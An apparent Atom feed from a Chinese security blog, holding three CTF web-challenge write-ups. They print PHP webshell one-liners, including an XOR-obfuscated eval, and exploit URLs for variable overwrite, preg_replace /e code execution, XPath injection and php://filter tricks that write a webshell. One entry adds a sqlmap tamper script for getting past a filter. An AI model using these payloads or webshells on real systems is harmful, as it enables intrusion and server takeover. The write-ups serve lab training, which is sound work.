<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Uknow’s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://uknowsec.cn/"/>
  <updated>2018-01-16T14:05:56.983Z</updated>
  <id>http://uknowsec.cn/</id>
  
  <author>
    <name>uknow</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>week 9 for cnas writeup</title>
    <link href="http://uknowsec.cn/posts/ctf/week-9-for-cnas-writeup.html"/>
    <id>http://uknowsec.cn/posts/ctf/week-9-for-cnas-writeup.html</id>
    <published>2018-01-16T13:38:18.000Z</published>
    <updated>2018-01-16T14:05:56.983Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="01-50"><a href="#01-50" class="headerlink" title="01 50"></a>01 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="external">http://47.100.121.220:28001/01.php</a></p>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">show_source(__FILE__); </div><div class="line">highlight_file(&apos;about.php&apos;); </div><div class="line">?&gt; &lt;?php </div><div class="line">$e = $_REQUEST[&apos;a&apos;]; </div><div class="line">$arr = array($_POST[&apos;b&apos;] =&gt; &apos;|.*|e&apos;,); </div><div class="line">array_walk($arr, $e, &apos;&apos;);</div></pre></td></tr></table></figure>
<p>如上代码，是一个PHP木马。是可以用菜刀连接的。</p>
<p>这里用到array_walk函数</p>
<p>array_walk() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array_walk(array,myfunction,userdata...)</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>array</td>
<td style="text-align:center">必需。规定数组。</td>
</tr>
<tr>
<td>myfunction</td>
<td style="text-align:center">必需。用户自定义函数的名称。</td>
</tr>
<tr>
<td>userdata,…</td>
<td style="text-align:center">可选。规定用户自定义函数的参数。您能够向此函数传递任意多参数。</td>
</tr>
</tbody>
</table>
<p>网上给的是用assert函数，但是这里用assert不行。然后在学长的提醒下，这里提到|e，</p>
<p>所以可以用preg_replace函数.</p>
<p>如下图构造菜刀连接</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/09_1.png" alt=""></p>
<p>或者直接hackbar</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/09_2.png" alt=""></p>
<h2 id="02-100"><a href="#02-100" class="headerlink" title="02 100"></a>02 100</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002/index.php" target="_blank" rel="external">http://47.100.121.220:28002/index.php</a></p>
<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">show_source(__FILE__); </div><div class="line">echo &quot;&lt;/br&gt;&quot;; </div><div class="line">highlight_file(&apos;about.php&apos;); </div><div class="line">echo &quot;&lt;/br&gt;&quot;; </div><div class="line">highlight_file(&apos;echo.php&apos;); </div><div class="line">?&gt; </div><div class="line">&lt;?php </div><div class="line">ob_start(&apos;assert&apos;); </div><div class="line">echo $_REQUEST[&apos;pass&apos;]; </div><div class="line">ob_end_flush(); </div><div class="line">//关键缓存每5分钟清理一次。&lt;/br&gt; </div><div class="line">&lt;?php </div><div class="line">include &quot;func.php&quot;; </div><div class="line"></div><div class="line">$your_real_ip = real_ip(); </div><div class="line">$path = &quot;temp/&quot;.$your_real_ip.&quot;_http_request_history.txt&quot;; </div><div class="line"></div><div class="line">$url = &apos;http://&apos;.$_SERVER[&apos;HTTP_HOST&apos;].$_SERVER[&apos;REQUEST_URI&apos;]; </div><div class="line">echo $your_real_ip.&quot;&lt;/br&gt;&quot;; </div><div class="line">echo $url; </div><div class="line"></div><div class="line">$fout = null; </div><div class="line">if(file_exists($path)) &#123; </div><div class="line">    $fout = fopen($path, &quot;ab&quot;) or die(&quot;Unable to open file!&quot;); </div><div class="line">&#125; </div><div class="line">else &#123; </div><div class="line">    $fout = fopen($path, &quot;wb&quot;) or die(&quot;Unable to open file!&quot;); </div><div class="line">&#125; </div><div class="line">fwrite($fout, $url.&quot;\n&quot;); </div><div class="line">fclose($fout); </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>这里也提到了一种PHP木马的写法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">ob_start(&apos;assert&apos;); </div><div class="line">echo $_REQUEST[&apos;pass&apos;]; </div><div class="line">ob_end_flush();</div></pre></td></tr></table></figure>
<p>ob_start(“assert”)的意思设置assert作为ob操作结束时回调函数，</p>
<p>这个PHP木马是没有回显的</p>
<p>但是在给出的echo.php的代码有给出一些提示</p>
<p>这里说到的是temp文件夹是有写的权限的。</p>
<p>所以如下执行</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/09_3.png" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/09_4.png" alt=""></p>
<h3 id="login-100"><a href="#login-100" class="headerlink" title="login 100"></a>login 100</h3><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003/" target="_blank" rel="external">http://47.100.121.220:28003/</a></p>
<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>这个题目注册完账号登录后会提示你</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">您已登录成功，但只有nari用户才可以看到flag.</div></pre></td></tr></table></figure>
<p>这里根本没有任何思路的，然后学长告诉我。</p>
<p>注册nari后加个空格就可以了，我一脸懵逼。他也不知道为什么？</p>
<p>所以我注册nari加两个空格进去了，拿到flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;a3afa127cfb57f423c7bc019587031020a2ce630&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>month 2 for cnas writeup</title>
    <link href="http://uknowsec.cn/posts/ctf/month-2-for-cnas-writeup.html"/>
    <id>http://uknowsec.cn/posts/ctf/month-2-for-cnas-writeup.html</id>
    <published>2018-01-06T14:29:49.000Z</published>
    <updated>2018-01-07T14:53:36.318Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="01-50"><a href="#01-50" class="headerlink" title="01 50"></a>01 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="external">http://47.100.121.220:28001/01.php</a></p>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>题目又是大写又是小写的，格式乱乱的，强迫症患了。</p>
<p>整理下代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">show_source(__file__); </div><div class="line">highlight_file(&apos;about.php&apos;); </div><div class="line">?&gt;</div><div class="line">&lt;?php $k=str_replace(&apos;`&apos;,&apos;&apos;,&apos;a`s`s`e`r`t&apos;);</div><div class="line">$m=$_POST[m];</div><div class="line">if($m==null)</div><div class="line">	header(&apos;status:404&apos;);</div><div class="line">else/**/</div><div class="line">	$k($m);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>这里的highlight_file在这里的作用就是读取文件代码的，下面是about.php的源码</p>
<p>看about的源码这里可以看出m的值为assert</p>
<p>最后的就相当于执行\$assert(\$m)，assert()执行代码。</p>
<p>传入system()函数来读取文件即可。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_1.png" alt=""></p>
<h2 id="02-50"><a href="#02-50" class="headerlink" title="02 50"></a>02 50</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002/02.php" target="_blank" rel="external">http://47.100.121.220:28002/02.php</a></p>
<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">show_source(__FILE__); </div><div class="line">highlight_file(&apos;about.php&apos;); </div><div class="line">?&gt; &lt;?php </div><div class="line">$YT=&quot;\x61\x73\x73\x65\x72\x74&quot;; </div><div class="line">$TH=&quot;\x80\xD3\xCB\x85\x9E\xB4\xB7\xCF\xD8\xBB\xCB\xCC\xD8\xE7\xA3\xD9\xC2\xBE\xAC&quot;; </div><div class="line">$TU=&quot;\xE5\xA5\xAA\xE9\xB6\x90\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\x97&quot;; </div><div class="line">@$YT($TH^$TU); </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>这个题目也有highlight_file函数也是用来读about的源码</p>
<p>这里我们可以直接测试输出这三个变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">$YT=&quot;\x61\x73\x73\x65\x72\x74&quot;; </div><div class="line">$TH=&quot;\x80\xD3\xCB\x85\x9E\xB4\xB7\xCF\xD8\xBB\xCB\xCC\xD8\xE7\xA3\xD9\xC2\xBE\xAC&quot;; </div><div class="line">$TU=&quot;\xE5\xA5\xAA\xE9\xB6\x90\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\x97&quot;; </div><div class="line">echo $YT;</div><div class="line">echo $TH^$TU; </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>代码运行得到</p>
<p>\$YT=assert </p>
<p>\$TH^\$TUeval($_POST[0x41]);</p>
<p>0x41是十六进制数，表示的字符是大写字符A，A的ASCII码为65</p>
<p>这里我用A传参是穿不进去的，用0x41也不行。但是用65可以成功传参</p>
<p>同样传入system函数执行命令</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_2.png" alt=""></p>
<h2 id="gift-100"><a href="#gift-100" class="headerlink" title="gift 100"></a>gift 100</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003/" target="_blank" rel="external">http://47.100.121.220:28003/</a></p>
<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>右键查看源码可以发现备份文件gift.php.bak</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$flag=&apos;xxx&apos;;</div><div class="line">extract($_GET);</div><div class="line">if(isset($gift))</div><div class="line">&#123;</div><div class="line">	$content=trim(file_get_contents($flag));</div><div class="line">	if($gift==$content)</div><div class="line">	&#123;</div><div class="line">		echo&apos;flag&#123;...&#125;&apos;;</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		echo&apos;Oh..&apos;;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>代码如上，这里考到一个变量覆盖的问题。</p>
<p>题目使用了extract(\$_GET)接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用extract()对变量进行覆盖，从而满足各个条件。</p>
<p>GET请求 ?flag=\&amp;gift=，extract()会将\$flag和\$gift的值覆盖了，将变量的值设置为空或者不存在的文件就满足\$gift == \$content。</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28003/gift.php?flag=&amp;gift=</div></pre></td></tr></table></figure>
<h2 id="variable-100"><a href="#variable-100" class="headerlink" title="variable 100"></a>variable 100</h2><h3 id="题目链接-3"><a href="#题目链接-3" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28004" target="_blank" rel="external">http://47.100.121.220:28004</a></p>
<h3 id="解答-3"><a href="#解答-3" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">error_reporting(0);</div><div class="line">include &quot;flag.php&quot;;</div><div class="line"></div><div class="line">$s = &quot;You can not get the flag!&lt;/br&gt;&quot;;</div><div class="line">echo $s;</div><div class="line"></div><div class="line">show_source(__FILE__);</div><div class="line"></div><div class="line">if(isset($_GET[&apos;a&apos;])) &#123;</div><div class="line">    $args = $_GET[&apos;a&apos;];</div><div class="line">    if(!preg_match(&quot;/^\w+$/&quot;,$args)) &#123;</div><div class="line">        die(&quot;error!&quot;);</div><div class="line">    &#125;</div><div class="line">    eval(&quot;var_dump($$args);&quot;);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>看代码可以看出我们需要去读flag.php里的变量flag，</p>
<p>这里变量可以用\$\$这种方式来传入我们的变量a通过var_dump函数来读取</p>
<p>传入flag是行不通的，flag.php中的存有flag的变量名并不是flag。</p>
<p>但是我们可以传入GLOBALS</p>
<p>\$GLOBALS是PHP中的全局变量，用来储存全局作用域中的变量</p>
<p>所以payload如下，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28004/04.php?a=GLOBALS</div></pre></td></tr></table></figure>
<h2 id="price-100"><a href="#price-100" class="headerlink" title="price 100"></a>price 100</h2><h3 id="题目链接-4"><a href="#题目链接-4" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28005" target="_blank" rel="external">http://47.100.121.220:28005</a></p>
<h3 id="解答-4"><a href="#解答-4" class="headerlink" title="解答"></a>解答</h3><p>这个题目纠结了很久，对order by 注入是不熟悉的，这里我找到了一篇关于order by注入的文章</p>
<p><a href="https://www.cnblogs.com/REscan/p/6884278.html" target="_blank" rel="external">Mysql Order By 注入总结</a></p>
<p>但是这里看的还是有些不懂的，不知道具体怎么去读取数据库的flag。</p>
<p>从文章里看出order by 注入是可以直接用sqlmap来跑的</p>
<p>但是测试可以发现，题目过滤空格和加号的，但是我还是不想手注，</p>
<p>想用sqlmap只能直接写个tamper了，tamper原来里面是有把空格变换成加号的脚本的。</p>
<p>但是这里加号也是过滤了的，我们只需要把tamper里的space2plus.py修改一下即可。</p>
<p>这里我们可以用%09来绕过</p>
<p>tamper 代码具体如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">from lib.core.enums import PRIORITY</div><div class="line"></div><div class="line">__priority__ = PRIORITY.LOW</div><div class="line"></div><div class="line">def dependencies():</div><div class="line">    pass</div><div class="line"></div><div class="line">def tamper(payload, **kwargs):</div><div class="line">    retVal = payload</div><div class="line"></div><div class="line">    if payload:</div><div class="line">        retVal = &quot;&quot;</div><div class="line">        quote, doublequote, firstspace = False, False, False</div><div class="line"></div><div class="line">        for i in xrange(len(payload)):</div><div class="line">            if not firstspace:</div><div class="line">                if payload[i].isspace():</div><div class="line">                    firstspace = True</div><div class="line">                    retVal += &quot;%09&quot;</div><div class="line">                    continue</div><div class="line"></div><div class="line">            elif payload[i] == &apos;\&apos;&apos;:</div><div class="line">                quote = not quote</div><div class="line"></div><div class="line">            elif payload[i] == &apos;&quot;&apos;:</div><div class="line">                doublequote = not doublequote</div><div class="line"></div><div class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</div><div class="line">                retVal += &quot;%09&quot;</div><div class="line">                continue</div><div class="line"></div><div class="line">            retVal += payload[i]</div><div class="line"></div><div class="line">    return retVal</div></pre></td></tr></table></figure>
<p>这里我们用这个脚本就能跑sqlmap了</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_3.png" alt=""></p>
<h2 id="hello-100"><a href="#hello-100" class="headerlink" title="hello    100"></a>hello    100</h2><h3 id="题目链接-5"><a href="#题目链接-5" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28006" target="_blank" rel="external">http://47.100.121.220:28006</a></p>
<h3 id="解答-5"><a href="#解答-5" class="headerlink" title="解答"></a>解答</h3><p>这个题拿到手是没有什么思路的，</p>
<p>但是做题之前之前习惯用burpsuit抓个包，利用scan扫一下的。</p>
<p>发现提示存在xpath注入</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_4.png" alt=""></p>
<p>这里的payload还爆出了三个类似用户名的信息</p>
<p>这个是HCTF 2015的一个原题，题目的把用户名改了</p>
<p>但是burpsuit已经帮我爆出了用户名。</p>
<p>修改下writeup的payload就可以得到flag了</p>
<p>具体的等考完试，看看xpath注入的内容结合题目源码去理解原理。</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28006/06.php?name=nari%27]|//*|user[user=%27ctfer</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>week 7 for cnas writeup</title>
    <link href="http://uknowsec.cn/posts/ctf/week-7-for-cnas-writeup.html"/>
    <id>http://uknowsec.cn/posts/ctf/week-7-for-cnas-writeup.html</id>
    <published>2017-12-29T16:38:42.000Z</published>
    <updated>2018-01-01T14:35:47.801Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="01-50"><a href="#01-50" class="headerlink" title="01 50"></a>01 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="external">http://47.100.121.220:28001/01.php</a></p>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>preg_replace() 函数用于正则表达式的搜索和替换。</p>
<h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed preg_replace( mixed pattern, mixed replacement, mixed subject [, int limit ] )</div></pre></td></tr></table></figure>
<h5 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h5><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>pattern</td>
<td style="text-align:center">正则表达式</td>
</tr>
<tr>
<td>replacement</td>
<td style="text-align:center">替换的内容</td>
</tr>
<tr>
<td>subject</td>
<td style="text-align:center">需要匹配替换的对象</td>
</tr>
<tr>
<td>limit</td>
<td style="text-align:center">可选，指定替换的个数，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换</td>
</tr>
</tbody>
</table>
<h5 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a>特别说明</h5><p>当Pattern参数使用/e修正符时，preg_replace函数会将replacement参数当作 PHP代码执行，那么，针对此种情况，当replacement内容为用户可控数据时，就可能导致命令注入攻击漏洞的形成。</p>
<p>由以上知识点可以得到本题的payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28001/01.php?a=/c/e&amp;b=system(&apos;cat flag.php&apos;)&amp;3=c</div></pre></td></tr></table></figure>
<h2 id="exit-150"><a href="#exit-150" class="headerlink" title="exit 150"></a>exit 150</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002" target="_blank" rel="external">http://47.100.121.220:28002</a></p>
<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">show_source(__FILE__); </div><div class="line">$c = &quot;&lt;?php exit;?&gt;&quot;; </div><div class="line">@$c.=$_GET[&apos;c&apos;]; </div><div class="line">@$filename = $_GET[&apos;file&apos;]; </div><div class="line">@file_put_contents($filename, $c); </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>题目给出了源码，我们可以看出这里是利用file_put_contents()函数来写shell，但是写入的shell里开头会加上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php exit;?&gt;;</div></pre></td></tr></table></figure>
<p>导致shell中写入的内容无法被解析，这里我们就需要想办法绕过这段代码</p>
<p>之前看过P神的一篇文章有讲过这个“死亡exit”的问题</p>
<p>具体可以参考P神博客</p>
<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="external">谈一谈php://filter的妙用</a></p>
<p>博客里介绍了三种方法绕过</p>
<p>第一种使用php://filter/write=convert.base64-decode</p>
<p>正如P神博客说的</p>
<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是&lt;?php exit; ?&gt;没有了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=convert.base64-decode/resource=z.php&amp;c=aPD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+</div></pre></td></tr></table></figure>
<p>我本地环境可以写Shell，连接菜刀可以。但是题目环境不行。</p>
<p>我们可以尝试写system函数读取flag，查看源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=convert.base64-decode/resource=z.php&amp;c=aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</div></pre></td></tr></table></figure>
<p>第二种使用php://filter/write=string.strip_tags|convert.base64-decode/resource</p>
<p>php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=string.strip_tags|convert.base64-decode/resource=z.php&amp;c=PD9waHAgQGV2YWwoJF9QT1NUWydjJ10pOz8+</div></pre></td></tr></table></figure>
<p>这个payload跟php版本有关的，我本地5.4的可以。题目环境不行。</p>
<p>第三种使用php://filter/write=string.rot13/resource</p>
<p>利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。&lt;?php exit; ?&gt;在经过rot13编码后会变成&lt;?cuc rkvg; ?&gt;，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=string.rot13/resource=a.php&amp;c=&lt;?cuc @riny($_CBFG[&apos;n&apos;]);?&gt;</div></pre></td></tr></table></figure>
<p>菜刀链接，如果不连接不上可以用system函数。</p>
<h2 id="easy-gallery-250"><a href="#easy-gallery-250" class="headerlink" title="easy_gallery 250"></a>easy_gallery 250</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003" target="_blank" rel="external">http://47.100.121.220:28003</a></p>
<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>这个题目是jarvisoj平台的一个原题的改编，链接如下：</p>
<p><a href="http://web.jarvisoj.com:32785" target="_blank" rel="external">http://web.jarvisoj.com:32785</a></p>
<p>但是基本的利用点是相同的，那就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?page=</div></pre></td></tr></table></figure>
<p>这个地方存在一个文件包含的漏洞，这个地方可以利用到</p>
<p>具体可以看到我上传完后取下来的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	require(&quot;header.php&quot;);</div><div class="line">	$page=&quot;&quot;;</div><div class="line">	if (isset($_GET[&apos;page&apos;]))</div><div class="line">		$page=$_GET[&apos;page&apos;].&quot;.php&quot;;</div><div class="line">	else</div><div class="line">		$page=&quot;main.php&quot;;</div><div class="line">	include($page);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>这个地方加上了一个.php是一个利用点。</p>
<p>根据原题的解题思路上传.jpg，然后利用这个文件包含点，%00截断是不行的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?page=图片ID.jpg%00</div></pre></td></tr></table></figure>
<p>在甜哥提醒下还是利用到了PHP伪协议，突然发现PHP伪协议在CTF题目利用到的很多</p>
<p>这里利用到zip://这个协议，具体可以参考我的博客</p>
<p><a href="http://uknowsec.cn/posts/notes/php%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E5%B0%8F%E7%BB%93.html">php支持的协议和封装协议小结</a></p>
<p>这里我们可以结合zip://和文件包含来解析我们的shell</p>
<p>具体，我们想写一个shell.php，zip打包，把扩展名改为.jpg上传</p>
<p>在文件包含利用点用以下payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28003/index.php?page=zip://uploads/图片ID.jpg#shell</div></pre></td></tr></table></figure>
<p>根据zip协议的知识和view的代码，shell后加上.php后缀。这样就可以被解析了。</p>
<p>我们就可以用菜刀连接到shell.php得到flag。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
